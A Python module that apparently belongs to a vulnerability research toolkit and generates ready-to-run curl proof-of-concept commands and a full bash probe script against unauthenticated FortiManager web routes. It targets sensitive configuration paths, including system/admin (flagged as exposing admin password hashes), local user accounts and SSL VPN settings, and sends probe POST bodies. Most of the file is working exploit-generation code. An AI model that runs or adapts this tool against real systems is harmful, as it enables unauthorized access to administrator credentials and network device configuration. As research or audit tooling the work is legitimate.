"""
poc_generator.py -- Generate curl PoC commands for pre-auth flatui routes.

Takes RouteEntry objects from PreAuthRouteAuditor and produces ready-to-run
curl commands with parameter substitution, correct Content-Type headers, and
method-appropriate payloads.

Handles all FortiManager URL parameter types:
  :adomOid         integer OID (default: 1 = root ADOM)
  :deviceOid       integer OID (default: 1)
  :vdomOid         integer OID (default: 1 = root VDOM)
  :adomName        ADOM name string (default: 'root')
  :deviceName      device name string (default: 'FortiGate-VM64')
  :vdomName        VDOM name string (default: 'root')
  <path>           wildcard subpath (default: 'system/admin')

Usage:
    from ablation.analyzers.preauth_route_auditor import PreAuthRouteAuditor
    from ablation.analyzers.poc_generator import PocGenerator

    auditor = PreAuthRouteAuditor.from_path('/tmp/fmg800_libs/libfmgd.so')
    routes = auditor.scan_routes(route_init_va=0x27b324, route_init_end_va=0x288d50)
    preauth = [r for r in routes if r.is_preauth]

    gen = PocGenerator(host='192.168.1.1', port=443)
    for route in preauth:
        print(gen.curl(route))
        print()
"""

from __future__ import annotations

import json
import shlex
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from .preauth_route_auditor import RouteEntry


# Default parameter substitutions for known URL parameter patterns.
# These are chosen to be valid on a default FortiManager deployment.
_DEFAULTS: Dict[str, str] = {
    ':adomOid':     '1',
    ':deviceOid':   '1',
    ':vdomOid':     '1',
    ':adomName':    'root',
    ':deviceName':  'FortiGate-VM64',
    ':vdomName':    'root',
    '<path>':       'system/admin',
}

# Additional high-value <path> targets for pm/config routes (FMG-F38).
# These paths expose sensitive config objects in the FMGD policy manager.
_PM_CONFIG_PATHS: List[str] = [
    'system/admin',            # admin user hashes (CRITICAL)
    'system/interface',        # interface config
    'system/global',           # global settings
    'firewall/policy',         # firewall policies
    'vpn/ssl/settings',        # SSL VPN config
    'user/local',              # local user accounts
]

# Default payloads by method (used for POST probes)
_POST_PAYLOADS: Dict[str, object] = {
    'pm/config': {
        'method': 'get',
        'params': [{}],
        'id': 1,
    },
    'certification': None,   # no body needed for GET-style cert probe
    'sdns': None,
}


@dataclass
class PocEntry:
    """A single generated PoC with method, URL, and curl command."""
    route_url: str
    method: str
    url: str
    curl_cmd: str
    notes: str = ''

    def fmt(self) -> str:
        lines = [
            f"# Route:  {self.route_url}",
            f"# Method: {self.method}",
        ]
        if self.notes:
            lines.append(f"# Notes:  {self.notes}")
        lines.append(self.curl_cmd)
        return '\n'.join(lines)


class PocGenerator:
    """
    Generates curl PoC commands for pre-auth flatui routes.

    Instantiate with the target host. Call curl() for a single RouteEntry or
    generate_all() for all pre-auth routes from an audit result.
    """

    def __init__(
        self,
        host: str = '192.168.1.1',
        port: int = 443,
        ssl_verify: bool = False,
        extra_headers: Optional[Dict[str, str]] = None,
        param_overrides: Optional[Dict[str, str]] = None,
        timeout: int = 10,
    ):
        self.host = host
        self.port = port
        self.ssl_verify = ssl_verify
        self.extra_headers = extra_headers or {}
        self.params = dict(_DEFAULTS)
        if param_overrides:
            self.params.update(param_overrides)
        self.timeout = timeout

    def _base_url(self) -> str:
        scheme = 'https' if self.port == 443 else 'http'
        if (self.port == 443 and scheme == 'https') or (self.port == 80 and scheme == 'http'):
            return f"{scheme}://{self.host}"
        return f"{scheme}://{self.host}:{self.port}"

    def _substitute(self, url_template: str) -> str:
        """Replace URL parameters with their default/override values."""
        url = url_template
        for param, value in self.params.items():
            url = url.replace(param, value)
        return url

    def _build_curl(
        self,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
    ) -> str:
        parts = ['curl']
        if not self.ssl_verify:
            parts.append('-k')
        parts.extend(['-s', '-o', '/dev/null', '-w', '%{http_code}'])
        parts.extend(['-X', method])
        parts.extend(['--max-time', str(self.timeout)])

        all_headers = {'Content-Type': 'application/json'} if body else {}
        all_headers.update(self.extra_headers)
        if headers:
            all_headers.update(headers)
        for k, v in all_headers.items():
            parts.extend(['-H', f'{k}: {v}'])

        if body:
            parts.extend(['-d', body])

        parts.append(url)
        return ' '.join(shlex.quote(p) for p in parts)

    def _infer_method(self, route: RouteEntry) -> List[str]:
        """Return list of HTTP methods to probe based on method_ids."""
        from .flatui_method_decoder import FlatuiMethodDecoder
        dec = FlatuiMethodDecoder()
        if route.method_ids:
            methods = dec.decode_ids(route.method_ids)
            # Always include GET for recon; add POST for write testing
            result = sorted(methods & {'GET', 'POST', 'PUT', 'DELETE', 'PATCH'})
            return result if result else ['GET']
        return ['GET']

    def curl(
        self,
        route: RouteEntry,
        methods: Optional[List[str]] = None,
        extra_paths: bool = False,
    ) -> List[PocEntry]:
        """
        Generate PoC entries for a single RouteEntry.

        If extra_paths=True and route is a pm/config wildcard, generates
        one entry per high-value <path> target.
        """
        if methods is None:
            methods = self._infer_method(route)

        base_url = self._base_url()
        entries: List[PocEntry] = []

        # Determine paths to probe
        url_template = route.url
        if '<path>' in url_template and extra_paths:
            path_variants = _PM_CONFIG_PATHS
        else:
            path_variants = [None]

        for path_override in path_variants:
            params = dict(self.params)
            if path_override:
                params['<path>'] = path_override
            gen = PocGenerator(
                host=self.host, port=self.port,
                ssl_verify=self.ssl_verify,
                extra_headers=self.extra_headers,
                param_overrides=params,
                timeout=self.timeout,
            )
            final_url = base_url + gen._substitute(url_template)
            for method in methods:
                body = None
                if method == 'POST':
                    body = self._post_body(route)
                cmd = gen._build_curl(method, final_url, body=body)
                notes = []
                if path_override:
                    notes.append(f'path={path_override!r}')
                if route.is_preauth:
                    notes.append('pre-auth (no session required)')
                if 'system/admin' in final_url:
                    notes.append('*** CRITICAL: exposes admin hashes ***')
                entries.append(PocEntry(
                    route_url=route.url,
                    method=method,
                    url=final_url,
                    curl_cmd=cmd,
                    notes='; '.join(notes),
                ))

        return entries

    def _post_body(self, route: RouteEntry) -> str:
        """Build a POST body appropriate for the route type."""
        if 'pm/config' in route.url:
            payload = {'method': 'get', 'params': [{}], 'id': 1}
        elif 'certification' in route.url:
            payload = {}
        else:
            payload = {}
        return json.dumps(payload)

    def generate_all(
        self,
        routes: List[RouteEntry],
        preauth_only: bool = True,
        extra_paths: bool = False,
    ) -> List[PocEntry]:
        """Generate PoC entries for all routes (or pre-auth-only)."""
        entries: List[PocEntry] = []
        for route in routes:
            if preauth_only and not route.is_preauth:
                continue
            entries.extend(self.curl(route, extra_paths=extra_paths))
        return entries

    def fmt_script(
        self,
        routes: List[RouteEntry],
        preauth_only: bool = True,
        extra_paths: bool = False,
    ) -> str:
        """Return a complete runnable bash script probing all routes."""
        entries = self.generate_all(routes, preauth_only=preauth_only, extra_paths=extra_paths)
        lines = [
            '#!/bin/bash',
            '# FortiManager pre-auth route PoC probe script',
            f'# Target: {self._base_url()}',
            '# Generated by ablation.analyzers.poc_generator',
            '',
            'set -euo pipefail',
            '',
        ]
        for e in entries:
            lines.append(f'# Route: {e.route_url}')
            if e.notes:
                lines.append(f'# Notes: {e.notes}')
            lines.append(f'echo -n "  {e.method} {e.url} -> "')
            lines.append(e.curl_cmd)
            lines.append('echo')
            lines.append('')
        return '\n'.join(lines)
